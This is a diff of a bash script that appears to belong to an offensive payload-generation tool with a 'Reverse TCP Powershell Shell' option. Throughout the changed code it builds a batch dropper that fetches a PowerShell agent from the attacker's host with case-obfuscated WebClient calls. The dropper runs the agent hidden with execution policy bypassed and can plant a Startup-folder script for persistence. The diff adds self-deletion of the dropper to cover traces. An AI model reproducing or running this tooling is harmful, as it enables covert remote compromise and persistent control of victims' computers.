@@ -12362,14 +12362,16 @@ echo "---"
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen by attacker)\nand writes 'Persiste.bat' into target Startup folder. Persiste.bat will execute\nour '$NaM.ps1' on every reboot.\n\nDo you wish to add persistence to dropper.bat ?" --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen by attacker)\nand writes 'Persiste.bat' into target Startup folder. Persiste.bat will execute\nour '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script and the end of execution.
 else
+   ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
@@ -12378,6 +12380,7 @@ else
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script and the end of execution.
 fi
 
 
@@ -12465,13 +12468,19 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: To delete 'persistence' from target machine we need to:\n\n1 - cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted\n2 - Del /F /Q $rpath\\$NaM.ps1 (agent.ps1)\n3 - Del /F /Q %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence.txt" --info > /dev/null 2>&1
+   ## Write how to delete persistence to output folder ..
+   echo "LHOST: $lhost" > $IPATH/output/delete_persistence.txt
+   echo "LPORT: $lport" >> $IPATH/output/delete_persistence.txt
+   echo "TO DELETE PERSISTENCE FROM TARGET MACHINE" >> $IPATH/output/delete_persistence.txt
+   echo "EXECUTE THE FOLLOW COMMANDS ON TARGET CMD" >> $IPATH/output/delete_persistence.txt
+   echo "-----------------------------------------" >> $IPATH/output/delete_persistence.txt
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q $rpath\\$NaM.ps1" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/delete_persistence.txt
 fi
 sh_menu
 }
-
-
-
 
 
 
